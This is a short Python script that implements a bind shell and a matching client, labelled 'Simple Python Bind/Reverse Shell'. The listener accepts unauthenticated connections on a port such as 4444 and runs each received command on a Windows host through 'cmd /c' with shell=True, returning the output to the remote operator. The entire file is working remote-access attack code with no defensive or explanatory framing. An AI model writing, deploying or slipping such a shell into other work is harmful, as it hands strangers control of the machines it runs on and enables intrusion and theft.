import socket, subprocess, threading, argparse,os

PORT=4444
MAX_BUFFER=4096

def execute_cmd(cmd):
    try:
        output = subprocess.check_output("cmd /c {}".format(cmd),stderr=subprocess.STDOUT, shell=True)

    except:
        output = b"Command failed"
    return output


def decode_and_strip(s):
    return s.decode("latin-1").strip()

def shell_thread(s):
    s.send(b"[ -- Connected! --]")
    try:
        while True:
            s.send(b"\r\nEnter Command> ")
            data = s.recv(MAX_BUFFER)
            if data:
                buffer = decode_and_strip(data)
                if not buffer or buffer == "exit":
                    s.close()
                    exit()

            print("Executing command: {} ".format(buffer))
            s.send(execute_cmd(buffer))
    except:
        s.close()
        exit()

def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            if data:
                s.send(data.encode("latin-1"))
    except:
        s.close()
        exit()

def receive_thread(s):
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                print("\n" + data, end="",flush=True)

    except:
        s.close()
        exit()

def server(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen()

    print("[-- Starting Bind Shell --]")
    while True:
        client, addr = s.accept()
        print("[ -- New User connected! -- ]".format(addr))
        threading.Thread(target=shell_thread, args=(client,)).start()

def client(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))

    print("[-- Connecting Reverse Shell --]")
    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=receive_thread, args=(s,)).start()

parser = argparse.ArgumentParser(description="Simple Python Bind/Reverse Shell")
parser.add_argument("-l", "--listen",  help="Listen for incoming connections")
parser.add_argument("-p", "--port",  help="Port to use")
parser.add_argument("-c", "--connect", help="IP address to connect to")
args = parser.parse_args()

if args.listen:
    server(args.listen,args.port)
elif args.connect:
    client(args.connect,args.port)